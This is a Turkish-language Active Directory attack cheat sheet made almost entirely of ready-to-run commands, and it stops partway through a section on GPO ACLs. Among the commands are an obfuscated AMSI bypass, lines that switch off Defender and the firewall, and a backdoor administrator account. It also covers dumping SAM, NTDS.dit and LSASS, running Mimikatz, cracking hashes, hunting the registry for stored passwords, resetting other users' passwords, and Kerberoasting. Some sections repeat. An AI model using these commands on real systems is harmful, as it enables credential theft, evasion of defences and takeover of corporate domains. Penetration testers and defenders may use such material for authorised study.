# Aktif Dizin Keşfetme ve Saldırı Rehberi

## Yerel Kullanıcı ve Grup Bilgileri

### Kullanıcı ve Ayrıcalık Bilgileri:
```powershell
whoami /priv
whoami /groups
echo %USERNAME% || whoami $env:username
```

### Yerel Kullanıcılar ve Son Giriş Bilgileri:
```powershell
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

### Etki Alanı Kullanıcı Bilgisi:
```powershell
net user UserName /domain
```

### Temel Grup Bilgileri:
```powershell
net localgroup
Get-LocalGroup | ft Name
net localgroup "Remote Management Users"
```

### Şifre Gereksinimleri:
```powershell
net accounts
```

### Yeni Kullanıcı Oluşturma:
```powershell
net user /add bhanu Bhanu@1234
net localgroup administrators bhanu /add
```

## Etki Alanı Keşfi

### Etki Alanı Denetleyicileri Listeleme:
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
```

### Etki Alanı Denetleyicisi Bulma:
```powershell
nltest /server:any_server_IP /dclist:domain_name
net view /domain
```

### Etki Alanı Üye Bilgileri:
```powershell
net view /domain:domain_name
```

### Uzak Bilgisayar MAC Adresi Alınması:
```powershell
nbtstat -A 10.10.10.10
```

### Paylaşım Bulma:
```powershell
net use e: \\10.10.10.10\ipc$ P@%%W0rd! /user:steins.local\username
net view \\10.10.10.10
```

### Paylaşımları Listeleme:
```powershell
net view \\hostname
```

### Paylaşım Bağlama:
```powershell
net use z: \\hostname\sharename z:
net use z: \\hostname\share /user:domain\username password
```

## Ağ Keşfi

### IP Adreslerini Listeleme:
```bash
nbtscan -r 10.10.10.10/24
```

### Ters DNS Sorguları:
```bash
nmap -sL 10.10.10.10/24
```

### Ad Sunucuları Listeleme:
```bash
dig -t NS domain_name
```

### Global Katalog Listeleme:
```bash
dig _gc.domain_name
```

### Ağ Arayüzlerini Listeleme:
```powershell
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Mevcut Yönlendirme Tablosunu Listeleme:
```powershell
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosunu Listeleme:
```powershell
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

### Aktif Bağlantıları Listeleme:
```powershell
netstat -ano
```

### SNMP Kullanarak Bilgi Toplama:
```bash
use auxiliary/scanner/snmp/snmp_login
snmpcheck.pl -c community_string -t 10.10.10.10
```

### Powershell Ping Tarama:
```powershell
1..255 | % {echo "192.168.1.$"; ping -n 1 -w 100 192.168.1.$} | Select-String ttl
```

### Firewall Durumunu ve Yapılandırmasını Listeleme:
```powershell
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

### Firewall’da Engellenen Portları Listeleme:
```powershell
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq "0"} | select name,applicationname,localports
```

### Firewall Devre Dışı Bırakma:
```powershell
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off
```

### AntiVirüs/Defender/Firewall Devre Dışı Bırakma:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
netsh advfirewall set allprofiles state off
```

### AMSI Devre Dışı Bırakma:
```powershell
sET-ItEM ('V'+'aR' + 'IA' + 'blE:1q2' + 'uZx') (TYpE); (GeT-VariaBle ("1Q2U" +"zX") -VaL)."AssEmbly"."GETTYPe"(("{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'))."getfiElD"(("{0}{2}{1}" -f'amsi','d','InitFaile'),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,')) ."sETVaLUE"(${nULl},${tRuE})
```

### RDP’yi Aktifleştirme:
```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```

### Proxychains ile RDP Bağlantısı:
```bash
proxychains rdesktop 10.10.10.10 -u Bhanu -p Bhanu@1234
```

### Tüm Paylaşımları Listeleme:
```powershell
net share
```

### SNMP Yapılandırması:
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

### DNS Taraması:
```bash
for /L %i in (1,1,255) do @nslookup 10.10.10.%i [server to resolve 2>nul | find "Name" && echo 10.10.10.%i
```

### NetBIOS Taraması:
```bash
for /L %i in (1,1,255) do @nbtstat A 10.10.10.%i 2>nul && echo 10.10.10.%i
```

### Powershell AD Modülü Kurulumu:
```powershell
Import Module ServerManager
Add-WindowsFeature RSAT-AD-PowerShell
```

---

## Yerel Yönetici Keşfetme

### Uzak Sunucunun Yerel Yönetici Kullanıcılarını Bulma:
```powershell
([ADSI]'WinNT://computer_name/Administrators').psbase.Invoke('Members') |%{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)}
```

### PowerView ile Yerel Yönetici Üye Listeleme:
```powershell
Get-NetLocalGroup -ComputerName computer_name
```

### API Kullanarak Yerel Yönetici Üye Listeleme:
```powershell
Get-NetLocalGroup -ComputerName computer_name -API
```

### Yerel Yönetici Kullanıcılarını Özyinelemeli Listeleme:
```powershell
Get-NetLocalGroup -ComputerName computer_name -Recurse
```

## SMB Kimlik Bilgileri Zorlaması

### Farklı IP Adreslerinde SMB Kullanıcılarını Listeleme:
```bash
cat ips.txt | while read line; do echo $line && rpcclient -U "Steins\username%P@ssword" -c "enumdomusers;quit" $line; done
```

### Kullanıcı Adları Üzerinden Test Yapma:
```bash
cat usernames.txt | while read line; do echo $line && rpcclient -U "$user%P@ssword" -c "getusername;quit" 10.10.10.10; done
```

### Python ile Zorlama:
```bash
python wmiexec.py domain/username:Passw0rd!@10.10.10.10 -dc-ip 10.10.10.1
```

## LDAP Keşfi

### LDAP Başlangıç Bilgileri:
```bash
ldapsearch -x -h 10.10.10.10 -s base namingcontexts
```

### Tüm LDAP Öğelerini Listeleme:
```bash
ldapsearch -x -h forest.htb.local -s sub -b 'DC=HTB,DC=LOCAL' | tee ldap_dump.txt
```

### LDAP ile Şifre Düşürme:
```bash
ldapsearch -x -h forest.htb.local -b 'DC=HTB,DC=LOCAL' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldapsearch -x -h 10.10.10.254 -D <> -w <> -b "dc=AJLAB,dc=COM" "(ms-MCS-AdmPwd=*)" ms-MSC-AdmPwd
```

## Etki Alanı Keşfi RPCClient Kullanarak

### Null Oturum Kullanarak:
```bash
rpcclient -U "" 10.10.10.10
```

### Kullanıcı Olarak Giriş Yapma:
```bash
rpcclient -U USERNAME //10.10.10.10
```

### Etki Alanı Kullanıcılarını Bulma:
```bash
rpcclient -Uuser_Name%PASSWORD -c enumdomusers 10.10.10.10
```

### Etki Alanı Bilgilerini Bulma:
```bash
rpcclient -Uuser_Name%PASSWORD -c querydominfo 10.10.10.10
```

### Gruplar ve Takma Adları Bulma:
```bash
rpcclient -Uuser_Name%PASSWORD -c "enumalsgroups builtin" 10.10.10.10
```

### Alias Kullanarak Ek Bilgi Bulma:
```bash
rpcclient -Uuser_Name%PASSWORD -c "queryaliasmem builtin 0x244" 10.10.10.10
```

### SID’leri Kullanarak Bilgi Bulma:
```bash
rpcclient $> lookupsids S-1-5-21-586154515854-343543654-8743952433-1105
```

### Diğer Kullanıcıların Şifrelerini Sıfırlama:
```bash
rpcclient -U user1 //10.10.10.10 setuserinfo2 USER2 23 'PASSWORD'
```

## RPCClient Kullanarak Keşif

### Etki Alanı Kullanıcılarını Listeleme:
```bash
enumdomusers
```

### Ayrıcalıkları Listeleme:
```bash
enumprivs
```

### Yazıcıları Listeleme:
```bash
enumprinters
```

### Sunucu Bilgilerini Listeleme:
```bash
srvinfo
```

### Etki Alanı Gruplarını Listeleme:
```bash
enumalsgroups domain
enumalsgroups builtin
```

### Yönetici Kullanıcıları Bulma:
```bash
queryuser 500
```

### SID Bilgilerini Listeleme:
```bash
lookupnames username/groupname
```

## SAM ve SYSTEM Dosyalarından Hash Alma

### Regedit Kullanarak Kayıt Alma:
```powershell
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system
```

### Impacket-Secretsdump Kullanarak Hash Alma:
```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```

### NTDS.DIT ve SYSTEM Dosyaları Kullanarak Hash Alma:
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### Hash Şifre Düşürme:
Eğer hash `31d6` ile başlıyorsa, şifre boş veya hesap devre dışıdır.
```bash
decrypt the hash from http://hashes.org/search.php
```

### Hash Kullanarak Giriş Yapma:
```bash
smbmap -u USER_NAME -p WHAT_EVER:THE_HASH_IS -H IP_ADDRESS
pwdump SYSTEM SAM > sam.txt
samdump2 SYSTEM SAM -o sam.txt
```

### CME ile SAM Hash’leri Dökme:
```bash
cme smb 10.10.10.10/24 -u Username -p Password --sam

# LSA Çıkartma ve Active Directory Saldırı Yöntemleri

## LSA Bilgisi Çıkartma
```bash
cme smb 10.10.10.10/24 -u KullaniciAdi -p Sifre --lsa
```

## NTDS.dit Dosyasını Çıkartma (DC'den)
```bash
cme smb 10.10.10.10/24 -u KullaniciAdi -p Sifre --ntds
```

## Mimikatz Kullanarak Kimlik Bilgilerini Çıkartma
### Mimikatz Komutları
```bash
mimikatz.exe
privilege::debug  # "200 OK" görmelisiniz.
sekurlsa::logonpasswords  # Kimlik bilgilerini ve diğer bilgileri çıkart.
lsadump::sam  # LSA'da depolanan bilgileri çıkart.
sekurlsa::tickets  # Mevcut biletleri görüntüle.
sekurlsa::tickets /export  # Tüm biletleri indir.
```

### PowerShell ile Mimikatz Çalıştırma
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
```

### NTLM Hashlerini Çıkartma ve Kırma
```bash
hashcat -m 1000 -a 3 hashes.txt rockyou.txt
john --format=LM hashes.txt --wordlist=rockyou.txt
```

### lsass.dmp Dosyasını Çıkartma
```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS.EXE_PID> lsass.dmp full

mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
```

## Kayıt Defterinden Parola Bulma
### Windows Otomatik Giriş
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

### VNC Parolaları
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server /v PasswordViewOnly"
vncpwd.exe PASSWORD_FROM_ABOVE
```

### SNMP Parametreleri
```bash
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

### Putty Oturumları
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

### WinSCP Anahtarlarını Şifre Çözme
```bash
reg query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions"
```

Şifre çözmek için [github-winscppassworddecrypt](https://github.com) kullanabilirsiniz.

### Kayıt Defterinde "password" Arama
```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Kimlik Yöneticisindeki Kimlik Bilgileri
```bash
cmdkey /list
dir C:\Users\kullaniciAdi\AppData\Local\Microsoft\Credentials
```

### Kaydedilmiş Kimlik Bilgileri ile Yönetici Olarak Komut Çalıştırma
```bash
runas /user:Administrator /noprofile /savecred "cmd.exe /c type C:\users\administrator\desktop\root.txt > C:\users\noob\root.txt"
```

## Ziyaret Edilen Web Sitelerini Listeleme
`Get-BrowserData.ps1` kullanabilirsiniz.

### Hash Yakalama
Eğer hedef bir web sitesine kimlik doğruluyorsa `Invoke-Inveigh` kullanabilirsiniz.
```powershell
Invoke-Inveigh -ConsoleOutput Y
```

### Alternatif Yöntem
Hedef makinede bir proxy kurarak düz metin kimlik bilgilerini yakalayabilirsiniz.

## Windows için PowerShell Sudo
```powershell
$pw = convertto-securestring "Parola" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "Domain\KullaniciAdi",$pw
$script = "C:\Users\KullaniciAdi\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'
```

## Linux Üzerinden Alan Adı Kullanıcılarını Listeleme
```bash
/usr/bin/ktutil
ktutil: read_kt /etc/krb5.keytab
ktutil: list
```
## Alan Adı (Domain) Sorgulama `adtool` Kullanarak
```bash
/opt/pbis/bin/adtool --keytab=/etc/krb5.keytab --logon-as=Server$ -a search-user --name test.user -t
```

### Bir Kullanıcıya Ait CN (Common Name) Alma
```bash
/opt/pbis/bin/adtool --keytab=/etc/krb5.keytab --logon-as=Server$ -a lookup-object --attr=unixHomeDirectory --dn 'CN=test.user,DC=steins,DC=local'
```

### Kullanıcı Özelliklerini Sorgulama
```bash
adtool -a search-user --name CN=TestUserCN -t | adtool -a lookup-object --dn=- --attr=userAccountControl
```

### AD Objelerinin Tüm Özelliklerini Sorgulama
```bash
adtool -a search-object --filter '(&(objectClass=person)(displayName=TestUser))' -t | adtool -a lookup-object
```

### Kullanıcıyı Bir Gruba Eklemek
```bash
adtool -a add-to-group --user TestUser --to-group=TestGroup
```

## Kullanıcı Gruplarının ID Bilgileri
- **513**: Domain Users
- **512**: Domain Admins
- **518**: Schema Admins
- **519**: Enterprise Admins
- **520**: Group Policy Creator Owners

## Active Directory Modülü Kullanarak Temel Alan Adı Sorguları
### Alan Adı Detaylarını Almak
```powershell
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()
```

### AD Modüllerini Yüklemek
```powershell
Import-Module Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module ActiveDirectory.psd1 -Verbose
```

## Kullanıcı Sorgulama
### Alan Adındaki Tüm Kullanıcıları Görüntüleme
```powershell
get-aduser
```

### Belirli Bir Kullanıcının Tüm Özelliklerini Görüntüleme
```powershell
get-aduser -Identity kyomah -Properties *
```

### Tüm Kullanıcı Objelerini Görüntüleme
```powershell
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
```

### Son Parola Değişiklik Tarihini Bulma
```powershell
Get-ADUser -Filter * -Properties * | select name, @{expression={[datetime]::fromFileTime($_.pwdLastSet)}}
```

### Kullanıcı Açıklamalarını Görüntüleme
```powershell
Get-ADUser -Filter 'Description -like "pass"' -Properties Description | select name,Description
Get-ADUser username -Properties * | Select Name,Description
```

### Hizmet Hesabı Olarak Kullanılan Hesapları Bulma
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Parola Politikasını Kontrol Etme
```powershell
Get-ADDefaultDomainPasswordPolicy
```

## Bilgisayar Sorgulama
### Alan Adındaki Tüm Bilgisayar İsimlerini Görüntüleme
```powershell
Get-ADComputer -Filter * | select name
```

### Alan Adındaki Bilgisayarları Listeleme
```powershell
get-adcomputer -filter * -Properties ipv4address | where {$_.IPV4address} | select name,ipv4address
```

### Belirli Bir Bilgisayarın Detaylarını Görüntüleme
```powershell
get-adcomputer -filter {ipv4address -eq '10.10.10.10'} -Properties Lastlogondate,passwordlastset,ipv4address
```

### Windows 2012 Sunucularını Bulma
```powershell
Get-ADComputer -Filter 'OperatingSystem -like "2019"' -Properties OperatingSystem | select Name,OperatingSystem
```

### Bilgisayarların Çevrimiçi Olup Olmadığını Kontrol Etme
```powershell
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```

### Grup ID'ye Göre Bilgisayar Bulma (Örn: DC = 516)
```powershell
Get-ADComputer -Filter * -Property PrimaryGroupID | Out-GridView
```

### Güvenilir Delege Edilmiş Bilgisayarları Bulma (Kerberos Delegasyonu)
```powershell
Get-ADComputer -filter {PrimaryGroupID -eq "515"} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation
```

## Kullanıcı Grupları Sorgulama
### Alan Adındaki Tüm Grupları Bulma
```powershell
Get-ADGroup -Filter * | select name
```

### Gruplar Hakkında Detaylı Bilgi Almak
```powershell
Get-ADGroup -Filter * -Properties *
```

### Belirli Bir Grubun Üyelerini Listeleme
```powershell
Get-ADGroupMember -Identity 'Enterprise Admins' -Recursive | select SamAccountName
```

### Kullanıcının Üyesi Olduğu Grupları Bulma
```powershell
Get-ADPrincipalGroupMembership -Identity UserName | select name
```

## GPO (Group Policy Object) Sorgulama
### Alan Adındaki Tüm GPO'ları Listeleme
```powershell
Get-gpo -all
```

### Kısıtlı Politikaları Görüntüleme
```powershell
Get-NetGPOGroup
```

### OU'ları (Organizational Unit) Bulma
```powershell
Get-ADOrganizationalUnit -Filter * -Properties *
```

## Orman (Forest) Sorgulama
### Alan Adı Güven İlişkilerini Haritalama
```powershell
Get-ADTrust -Identity steins.local
```

### Orman Detaylarını Almak
```powershell
Get-ADForest
Get-AdForest -Identity Steins.local
```

### Ormandaki Tüm Alan Adlarını Listeleme
```powershell
(Get-ADForest).Domains
```

### Ormandaki Tüm Global Katalogları Listeleme
```powershell
Get-ADForest | select -ExpandProperty GlobalCatalogs
```

### Ormandaki Güven İlişkilerini Haritalama
```powershell
Get-ADTrust -Filter 'msDS-TrustForestTrustinfo -ne "$null"'
```

## PowerView ile Temel Alan Adı Sorguları
### PowerView'i Yüklemek
```powershell
powershell.exe -ep bypass
Import-Module ./PowerView.ps1
```

### Alan Adı Listeleme
```powershell
Get-Domain
```

### Kullanıcı Sorgulama
```powershell
Get-DomainUser
Get-DomainUser -Name User1
```

### Hizmet Hesabı Olarak Kullanılan Hesapları Bulma
```powershell
Get-NetUser -SPN
Get-DomainUser -SPN
```

### AdminCount Özelliği 1 Olan Kullanıcıları Bulma (Genellikle Domain Adminleri)
```powershell
Get-NetUser -AdminCount
## 1. GPP Parolasının Uygulandığı Tüm Bilgisayar DNS Adlarını Bulma
```powershell
Get-DomainOU -GPLink '<GPP_GUID>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
```

## 2. Devre Dışı Kullanıcılar
```powershell
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter ACCOUNTDISABLE
```

## 3. Kerberos Ön Kimlik Doğrulaması Ayarlanmamış Kullanıcıları Bulma
```powershell
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

## 4. "Domain Admins" Grubundaki Hizmet Hesaplarını Bulma
```powershell
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
```

## 5. sidHistory Ayarı Olan Kullanıcıları Bulma
```powershell
Get-DomainUser -LDAPFilter '(sidHistory=*)'
```

## 6. Constrained Delegation Kullanıcı ve Bilgisayarlarını Bulma
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

## 7. Unconstrained Delegation İzin Veren Sunucuları ve Hassas Kullanıcıları Listeleme
```powershell
$Computers = Get-DomainComputer -Unconstrained
$Users = Get-DomainUser -AllowDelegation -AdminCount
```

## 8. Belirli Bir OU'da SPN Ayarlı Kullanıcıları Kerberoast Yapma
```powershell
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"
```

## 9. Kullanıcı Yerlerini Bulma (Eski: Invoke-UserHunter)
### Tüm Kullanıcıları ve Bilgisayarları Listeleme
```powershell
Find-DomainUserLocation
```

## 10. Unconstrained Kerberos Delegation İzin Veren Sunucuları ve Giriş Yapan Kullanıcıları Listeleme
```powershell
Find-DomainUserLocation -ComputerUnconstrained -ShowAll
```

## 11. Unconstrained Delegation İzin Veren Sunucularda Yetkili Kullanıcıları Avlama
```powershell
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
```

## 12. Belirli Bir Domain'deki Sunucu OU'sundaki Tüm Bilgisayarların Oturum Açmış Kullanıcılarını Almak
```powershell
Get-DomainOU -Identity server -Domain | %{Get-DomainComputer -SearchBase $.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $}}
```

---

### Bilgisayar ve Paylaşım Taramaları

#### 12.1 Domain'deki Tüm Bilgisayarları Görüntüleme
```powershell
Get-DomainComputer | Select name
```

#### 12.2 Domain Bilgisayarlarına Bağlantı Kontrolü
```powershell
Get-DomainComputer -Ping
```

#### 12.3 Tüm Paylaşımları Bulma
```powershell
Find-DomainShare
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC
Get-NetfileServer --help
```

#### 12.4 Belirli Bir Makinedeki Tüm Grupları Listeleme
```powershell
Get-NetLocalGroup -ComputerName steinsdc -ListGroups
```

#### 12.5 Domain Admin (kullanıcı/grup) Oturumu Olan Bilgisayarları Bulma
```powershell
Invoke-UserHunter -GroupName "RDPUsers"
```

#### 12.6 MSSQL Sunucuları Bulma
```powershell
Get-NetComputer -SPN mssql*
```

---

## 13. Domain GPO'larını Görüntüleme ve Yönetme

#### 13.1 Tüm GPO'ları Görüntüleme
```powershell
Get-DomainGPO | Select displayname
Get-NetGPO
Get-NetGPO | select displayname,name,whenchanged
```

#### 13.2 Belirli Bir Bilgisayarın GPO Politikalarını Görüntüleme
```powershell
Get-DomainGPO -ComputerName dc.steins.local
```

#### 13.3 GPO İle Bilgisayar Yöneticilerini Bulma
```powershell
Find-GPOComputerAdmin -ComputerName computer_name
```

#### 13.4 SYSVOL'de Yönetici Kimlik Bilgileri Bulma
```plaintext
\Domain_Name\SYSVOL\Domain_Name\Policies\
```

## Yerel Yönetici Yetkilerini Listeleme

Bir kullanıcı/grup kimliğinin hangi makinelere yerel yönetici yetkisi olduğunu listelemek:

```powershell
Get-DomainGPOUserLocalGroupMapping -Identity <Kullanıcı/Grup>
```

Belirtilen bir alan üzerinde bir kullanıcının hangi makinelere RDP erişim hakkı olduğunu listelemek:

```powershell
Get-DomainGPOUserLocalGroupMapping -Identity -Domain -LocalGroup RDP
```

Tüm GPO haritalamalarını bir CSV dosyasına aktarmak:

```powershell
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
```

## Paylaşım Keşfetme

Alan içindeki tüm paylaşımları bulmak:

```powershell
Find-DomainShare -Verbose
Get-DomainFileServer -Verbose
```

Paylaşımları keşfetmek:

```powershell
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC
```

Alan içindeki hassas dosyaları bulmak:

```powershell
Invoke-FileFinder -Verbose
```

Yüksek önemdeki dosya sunucularını veya hedefleri bulmak:

```powershell
Get-NetFileServer -Verbose
```

## ACL Keşfetme

Belirli bir nesne ile ilgili ACL'leri almak:

```powershell
Get-ObjectAcl -SamAccountName KULLANICI_ADI -ResolveGUIDs
```

Belirli bir önekle ilişkili ACL'leri almak:

```powershell
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -verbose
```

Bir kullanıcının ACL'lerini görüntülemek:

```powershell
(Get-Acl 'AD:\CN=Houin Kyoma,CN=Users,DC=STEINS,DC=local').Access
```

Belirtilen LDAP yoluyla ilgili ACL'leri almak:

```powershell
Get-ObjectACL -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=DC,DC=Steins,DC=local" -ResolveGUIDs -Verbose
```

ACE'leri (örn. yazma, değiştirme) aramak:

```powershell
Invoke-ACLScanner -ResolveGUIDs
```

Belirli bir kullanıcı üzerinde hangi izinlere sahip olduğumuzu kontrol etmek:

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Kullanıcı1"}
```

GPO izinleri için ACL'leri görüntülemek:

```powershell
Get-NetGPO | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -Name $_.name} | Where-Object {$_ActiveDirectoryRights -match 'WriteProperty'}
```

DCSync haklarına sahip kullanıcıları bulmak:

```powershell
Get-ObjectACL -DistinguishedName "dc=steins,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or $_.ActiveDirectoryRights -match 'GenericAll'}
```

AdminSDHolder ACL'lerini görüntülemek:

```powershell
Get-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs | ?{$_.IdentityReference -match 'KullanıcıAdı1'}
```

### Yerel Yönetici Keşfi

Belirtilen bir bilgisayarda yerel yönetici grubunun üyelerini almak:

```powershell
Get-NetLocalGroup -ComputerName bilgisayar_adı
```

Yerel yönetici grubunu API çağrısı kullanarak almak:

```powershell
Get-NetLocalGroup -ComputerName bilgisayar_adı -API
```

Yerel yönetici grubu üyelerini yinelemeli olarak almak:

```powershell
Get-NetLocalGroup -ComputerName bilgisayar_adı -Recurse
```

### Orman Keşfi

Orman bilgilerini almak:

```powershell
Get-NetForest
```

Mevcut ormandaki tüm alan adlarını listelemek:

```powershell
Get-NetForestDomain
```

Alan adı denetleyicisi listesini almak:

```powershell
Get-NetDomain
```

FSMO rolleri için PDC Emulator'ı bulmak:

```powershell
Get-ADForest | Select-Object -ExpandProperty RootDomain | Get-ADDomain | Select-Object -Property PDCEmulator
```

Tüm domain trust'larını listelemek ve bir CSV'ye aktarmak:

```powershell
Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv
```

### Kullanıcı Avlama

"Domain Admins" grubunun oturum açtığı tüm bilgisayarları bulmak:

```powershell
Invoke-UserHunter -Verbose
```

Belirli bir grubun oturum açtığı tüm bilgisayarları bulmak:

```powershell
Invoke-UserHunter -GroupName "RDPUsers"
```

Yüksek önemli hedeflerdeki "domain admin" oturumlarını bulmak:

```powershell
Invoke-UserHunter -Stealth -ShowAll
```

Kullanıcının yerel RDP erişim hakkı olduğu bilgisayarları bulmak:

```powershell
Find-GPOLocation -UserName kullanici_adi -LocalGroup RDP
```

### Kerberoasting

Kerberos ile SPN ayarlı kullanıcıları bulmak:

```powershell
Get-NetUser -SPN
```

TGS bileti almak ve hash'i çıkarmak:

```powershell
Invoke-Kerberoast -OutputFormat Hashcat
```

Bu hash'i "rockyou.txt" gibi bir sözcük listesi ile kırmak:

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force
```

### AS-REP Roasting

PreAuth gereksinimi olmayan kullanıcıları bulmak:

```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

AS-REP hash'ini almak ve kırmak:

```bash
GetNPUsers.py domain/username -dc-ip 10.10.10.10
john hash --wordlist=rockyou.txt
```

## Kullanıcı/Grup Kimliklerini Yerel Yönetici Yetkisiyle Listeleme

### Belirli bir kullanıcı veya grubun hangi makinelerde yerel yönetici yetkisi olduğunu listele:
```powershell
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>
```

### Belirli bir alan adında kullanıcının RDP erişimi olan makineleri listele:
```powershell
Get-DomainGPOUserLocalGroupMapping -Identity -Domain -LocalGroup RDP
```

### Tüm GPO haritalamalarını bir CSV dosyası olarak dışa aktar:
```powershell
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
```

---

## Paylaşım (Şube) Tarama

### Alan adındaki tüm paylaşımları bul:
```powershell
Find-DomainShare -Verbose
```

### Dosya sunucularını listele:
```powershell
Get-DomainFileServer -Verbose
```

### Tüm paylaşımları tara:
```powershell
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC
```

### Alan adındaki bilgisayarlarda hassas dosyaları ara:
```powershell
Invoke-FileFinder -Verbose
```

### Yüksek değerli hedefleri bul:
```powershell
Get-NetfileServer -Verbose
```

---

## ACL (Erişim Kontrol Listesi) Tarama

### Belirtilen nesneyle ilişkili ACL'leri listele:
```powershell
Get-ObjectAcl -SamAccountName USERNAME -ResolveGUIDs
```

### Belirtilen prefix ile ACL'leri listele:
```powershell
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -verbose
```

### Bir kullanıcının ACL'lerini görüntüle:
```powershell
(Get-Acl 'AD:\CN=Houin Kyoma,CN=Users,DC=STEINS,DC=local').Access
```

### Belirtilen LDAP yoluyla ACL'leri tara:
```powershell
Get-ObjectACL -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=DC,DC=Steins,DC=local" -ResolveGUIDs -Verbose
```

### İlginç ACE'leri (yazma, değiştirme) ara:
```powershell
Invoke-ACLScanner -ResolveGUIDs
```

### Kullanıcılar için 'GenericWrite' izni:
```powershell
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
```

### 'GenericAll' izinlerine sahip kullanıcıları bul:
```powershell
Invoke-ACLScanner -ResolveGUIDs -ADSpath 'OU= X , Y , Z , W ' | Where {$_.ActiveDirectoryRights -eq 'GenericAll'}
```

### Hangi kullanıcının üzerinde değişiklik yapma iznine sahip olduğunuzu kontrol edin:
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "User1"}
```

### GPO izinleri için ACL'leri görüntüle:
```powershell
